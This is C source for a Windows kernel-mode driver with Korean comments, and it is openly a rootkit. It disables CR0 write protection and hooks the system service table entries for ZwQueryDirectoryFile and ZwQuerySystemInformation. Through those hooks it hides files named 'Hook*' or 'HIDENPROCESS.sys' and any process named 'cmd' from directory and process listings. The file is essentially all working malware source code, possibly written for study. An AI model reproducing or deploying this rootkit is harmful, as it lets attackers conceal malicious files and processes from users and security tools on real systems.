#include "ntddk.h"

#pragma pack(1)
//SDE 구조체 선언
typedef struct ServiceDescriptorEntry {
	unsigned int* ServiceTableBase;	//KiServiceTable(SSDT) 주소
	unsigned int* ServiceCounterTableBase;	//함수 호출 횟수
	unsigned int NumberOfServices;	//서비스 주소 갯수
	unsigned char* ParamTableBase;	//함수 인자크기 테이블
} ServiceDescriptorTableEntry_t, * PServiceDescriptorTableEntry_t;	//KeServiceDescriptorTable
#pragma pack()

//SSDT 임포트
__declspec(dllimport) ServiceDescriptorTableEntry_t KeServiceDescriptorTable;

//SSDT 주소를 리턴하는 매크로
#define Syscall_Index(_Func) *(PULONG) ((PUCHAR)_Func+1)	//함수의 인덱스 번호
#define Syscall_Ptr(_Org_Func) &(((PLONG)KeServiceDescriptorTable.ServiceTableBase)[Syscall_Index(_Org_Func)]) //함수의 주소 반환

//WP 무력화를 위한 bit mask

#define SetCr_Mask 0x0FFFEFFFF

const WCHAR deviceLinkBuffer[] = L"\\DosDevices\\HIDENPROCESS";
const WCHAR deviceNameBuffer[] = L"\\Device\\HIDENPROCESS";
PDEVICE_OBJECT g_RootkitDevice;	//디바이스 오브젝트에 대한 전역 포인터 변수

//FileInfromation 구조체 선언
struct _FILE_INFORMATION
{
	ULONG NextEntryOffset;
	ULONG FileIndex;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG FileAttributes;
	ULONG FileNameLength;
	ULONG EaSize;
	CCHAR ShortNameLength;
	WCHAR ShortName[12];
	WCHAR FileName[1];
};
//SystemInformation 구조체 선언
struct _SYSTEM_THREADS
{
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientIs;
	KPRIORITY Priority;
	KPRIORITY BasePriority;
	ULONG ContextSwitchCount;
	ULONG ThreadState;
	KWAIT_REASON WaitReason;
};
//SystemInformation 구조체 선언
struct _SYSTEM_PROCESSES
{
	ULONG NextEntryDelta;	//다음 SYSTEMPROCESS 주소의 오프셋
	ULONG ThreadCount;	//스레드 갯수
	ULONG Reserved[6];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;	//프로세스 이름
	KPRIORITY BasePriority;	//권한정보
	ULONG ProcessId;
	ULONG InheritedFromProcessId;
	ULONG HandleCount;
	ULONG Reserved2[2];
	VM_COUNTERS VmCounters;
	IO_COUNTERS IoCounters; //windows 2000 only
	struct _SYSTEM_THREADS Threads[1];	//프로세스 스레드 리스트
};

NTSYSAPI /* ntdef.h에서 DECLSPEC_IMPORT로 정의*/
NTSTATUS//리턴타입
NTAPI	//ntdef.h에서 stdcall로 정의
ZwQuerySystemInformation(IN ULONG SystemInformationClass, IN PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength);
NTSYSAPI NTSTATUS NTAPI ZwQueryDirectoryFile(IN HANDLE fileHandle, IN HANDLE Event OPTIONAL, IN PIO_APC_ROUTINE ApcRoutine OPTIONAL, IN PVOID ApcContext OPTIONAL, OUT PIO_STATUS_BLOCK IoStatusBlock, OUT PVOID FileInformation, IN ULONG Length, IN FILE_INFORMATION_CLASS FileInformationClass, IN BOOLEAN ReturnSingleEntry, IN PUNICODE_STRING FileName OPTIONAL, IN BOOLEAN RestartScan);
typedef NTSTATUS(*ZWQUERYSYSTEMINFORMATION)(ULONG SystemInformationCLass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
typedef NTSTATUS(*ZWQUERYDIRECTORYFILE)(IN HANDLE fileHandle, IN HANDLE Event OPTIONAL, IN PIO_APC_ROUTINE ApcRoutine OPTIONAL, IN PVOID ApcContext OPTIONAL, OUT PIO_STATUS_BLOCK IoStatusBlock, OUT PVOID FileInformation, IN ULONG Length, IN FILE_INFORMATION_CLASS FileInformationClass, IN BOOLEAN ReturnSingleEntry, IN PUNICODE_STRING FileName OPTIONAL, IN BOOLEAN RestartScan);
//기존의 함수 주소 저장을 위한 변수
ZWQUERYSYSTEMINFORMATION OldZwQuerySystemInformation;
ZWQUERYDIRECTORYFILE OldZwQueryDirectoryFile;

//CR0의 WP를 제거
VOID ClearCr_WP(VOID)
{
	__asm {
		cli;
		push eax;
		mov eax, cr0;
		and eax, SetCr_Mask;
		mov cr0, eax;
		pop eax;
	}
}
//CR0의 WP를 설정
VOID SetCr_WP(VOID)
{
	__asm {
		push eax;
		mov eax, cr0;
		or eax, not SetCr_Mask;
		mov cr0, eax;
		pop eax;
		sti;
	}
}
//새로운 ZwQueryDirectoryFile
NTSTATUS NewZwQueryDirectoryFile(IN HANDLE fileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN ULONG Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN ReturnSingleEntry,
	IN PUNICODE_STRING FileName OPTIONAL,
	IN BOOLEAN RestartScan)
{
	NTSTATUS ntStatus;
	//NtQueryDirectoryFile 함수 호출
	ntStatus = ((ZWQUERYDIRECTORYFILE)(OldZwQueryDirectoryFile)) (fileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
	if (NT_SUCCESS(ntStatus))
	{
		//FileInformation 구조체
		struct _FILE_INFORMATION* curr = (struct _FILE_INFORMATION*)FileInformation;
		struct _FILE_INFORMATION* prev = NULL;
		DbgPrint("\n");
		while (curr)
		{
			if (curr->FileName != NULL)
			{
				//파일명이 "Hook"으로 시작하거나 "TestFile.txt"인 경우
				if ((0 == memcmp(curr->FileName, L"Hook", 8)) || (0 == memcmp(curr->FileName, L"HIDENPROCESS.sys", 32)))
				{
					//전 FileInformation이 존재하는 경우
					if (prev)
					{
						//전 FileInformation의  NetxtEntryOffset에 다음 FileInformation의 위치를 저장한다.
						if (curr->NextEntryOffset)
							prev->NextEntryOffset += curr->NextEntryOffset;
						//마지막 프로세서일 경우
						else
							prev->NextEntryOffset = 0;
					}
					//전 FileInformation이 존재하지 않는 경우
					else
					{
						//다음 FileInformation이 존재하는 경우
						if (curr->NextEntryOffset)
						{
							//다음 FileInformation을 맨 앞의FileInformation으로 만든다.
							(char*)FileInformation += curr->NextEntryOffset;
						}
						//마지막 프로세서일 경우
						else
							FileInformation = NULL;
					}
				}
			}
			//현재 FileInformation을 저장
			prev = curr;
			//다음 FileInformation으로 넘어감
			if (curr->NextEntryOffset) ((char*)curr += curr->NextEntryOffset);
			else curr = NULL;
		}
	}
	return ntStatus;
}

//새로운 ZwQuerySystemFile
NTSTATUS NewZwQuerySystemInformation(IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength)
{
	NTSTATUS ntStatus;
	//NtQuerySystemInfrormation 함수 호출
	ntStatus = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (NT_SUCCESS(ntStatus))
	{
		if (SystemInformationClass == 5)
		{
			struct _SYSTEM_PROCESSES* curr = (struct _SYSTEM_PROCESSES*)SystemInformation;
			struct _SYSTEM_PROCESSES* prev = NULL;
			while (curr)
			{
				if (curr->ProcessName.Buffer != NULL)
				{
					//프로세스명이 "cmd"인 경우
					if (0 == memcmp(curr->ProcessName.Buffer, L"cmd", 6))
					{
						//전 SystemInformation이 존재하는 경우
						if (prev)
						{
							//전 SystemInformation의 NetxtEntryDelta에 다음 SystemInformation의 위치를 저장한다.
							if (curr->NextEntryDelta)
								prev->NextEntryDelta += curr->NextEntryDelta;
							//마지막 프로세서일 경우
							else
								prev->NextEntryDelta = 0;
						}
						//전 SystemInformation이 존재하지 않는 경우
						else
						{
							//다음 SystemInformation을 맨 앞의 SystemInformation으로 만든다.
							if (curr->NextEntryDelta)
							{
								(char*)SystemInformation += curr->NextEntryDelta;
							}
							//마지막 프로세서일 경우
							else
								SystemInformation = NULL;
						}
					}
				}
				//현재 SystemInformation을 저장
				prev = curr;
				//다음 SystemInformation으로 넘어감
				if (curr->NextEntryDelta) ((char*)curr += curr->NextEntryDelta);
				//다음 SystemInformation이 존재하지 않는다면
				else curr = NULL;
			}
		}
	}
	return ntStatus;
}
//드라이버 언로드 루틴
//IRP 처리함수
NTSTATUS OnStubDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP irp)
{
	irp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}
VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING Name;
	DbgPrint("OnUnload called\n");
	//WP 무력화
	ClearCr_WP();
	//후킹한 SSDT를 원상복귀 시킨다.
	InterlockedExchange((LONG*)Syscall_Ptr(ZwQueryDirectoryFile), (LONG)OldZwQueryDirectoryFile);
	InterlockedExchange((LONG*)Syscall_Ptr(ZwQuerySystemInformation), (LONG)OldZwQuerySystemInformation);
	//WP 설정
	SetCr_WP();
	RtlInitUnicodeString(&Name, deviceLinkBuffer);
	IoDeleteSymbolicLink(&Name);                     // 심볼릭 링크 삭제
	IoDeleteDevice(DriverObject->DeviceObject);  // 디바이스 삭제
	DbgPrint("Unload complete!\n");
}
//드라이버 엔트리 루틴
NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath)
{
	NTSTATUS ntStatus;
	KIRQL OldIrql;
	UNICODE_STRING deviceNameUnicodeString;
	UNICODE_STRING deviceLinkUnicodeString;
	int i;

	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
		theDriverObject->MajorFunction[i] = OnStubDispatch;
	}
	theDriverObject->DriverUnload = OnUnload;
	RtlInitUnicodeString(&deviceNameUnicodeString, deviceNameBuffer);
	RtlInitUnicodeString(&deviceLinkUnicodeString, deviceLinkBuffer);
	ntStatus = IoCreateDevice(theDriverObject, 0, &deviceNameUnicodeString, FILE_DEVICE_UNKNOWN, 0, TRUE, &g_RootkitDevice);
	if (NT_SUCCESS(ntStatus)) {
		ntStatus = IoCreateSymbolicLink(&deviceLinkUnicodeString, &deviceNameUnicodeString);
		DbgPrint("Create Symbolic\n");
	}

	OldZwQueryDirectoryFile = (ZWQUERYDIRECTORYFILE)Syscall_Ptr(ZwQueryDirectoryFile);
	OldZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)Syscall_Ptr(ZwQuerySystemInformation);
	KeRaiseIrql(DISPATCH_LEVEL, &OldIrql);
	//WP 무력화
	ClearCr_WP();
	//SSDT 후킹
	OldZwQueryDirectoryFile = (ZWQUERYDIRECTORYFILE)InterlockedExchange
	((LONG*)Syscall_Ptr(ZwQueryDirectoryFile), (LONG)NewZwQueryDirectoryFile);
	OldZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)InterlockedExchange
	((LONG*)Syscall_Ptr(ZwQuerySystemInformation), (LONG)NewZwQuerySystemInformation);
	//WP 설정
	SetCr_WP();
	KeLowerIrql(OldIrql);
	return STATUS_SUCCESS;
}